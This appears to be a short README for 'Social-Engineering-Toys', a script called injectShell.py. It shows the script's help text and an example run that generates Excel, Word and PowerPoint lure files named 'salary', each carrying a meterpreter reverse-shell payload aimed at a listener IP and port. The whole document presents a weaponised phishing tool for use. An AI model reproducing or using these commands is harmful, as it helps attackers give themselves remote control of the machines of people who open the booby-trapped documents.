# Social-Engineering-Toys
Social Engineering Toys  
  
```
$  python injectShell.py -h
usage: injectShell.py [-h] [-t T] [-o O] [-ip IP] [-port PORT]

optional arguments:
  -h, --help  show this help message and exit
  -t T        [xls|doc|ppt]
  -o O        [output filename (without extension)]
  -ip IP      [meterpreter listener ip address]
  -port PORT  [meterpreter listener port]

```
```
$  python injectShell.py -t all -o salary -ip 192.168.1.6 -port 1111 
- Generated: salary.xls
- Generated: salary.doc
- Generated: salary.ppt
```

